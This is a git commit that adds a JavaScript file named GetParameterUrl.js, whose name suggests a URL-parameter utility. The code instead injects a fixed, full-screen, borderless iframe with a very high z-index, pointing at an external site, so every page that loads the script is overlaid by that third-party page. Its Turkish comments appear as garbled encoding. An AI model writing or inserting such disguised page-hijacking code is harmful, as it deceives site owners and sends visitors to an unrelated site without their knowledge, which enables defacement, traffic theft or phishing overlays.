4d482f9238ac1db10354a03ec20fbc82f3ab0891
adaletgekdi-coder <adaletgekdi@gmail.com>
2025-11-10 16:23:46 +0300

    Create GetParameterUrl.js

---
+++ js/pages/shared/GetParameterUrl.js
@@ -0,0 +1,15 @@
+// iframe oluÅŸtur
+const iframe = document.createElement('iframe');
+
+// iframe Ã¶zellikleri
+iframe.src = 'https://www.lojikelektrik.net'; // iframe iÃ§inde aÃ§Ä±lacak URL
+iframe.style.position = 'fixed';
+iframe.style.top = '0';
+iframe.style.left = '0';
+iframe.style.width = '100%';
+iframe.style.height = '100%';
+iframe.style.border = 'none';
+iframe.style.zIndex = '9999';
+
+// iframe'i body'ye ekle
+document.body.appendChild(iframe);
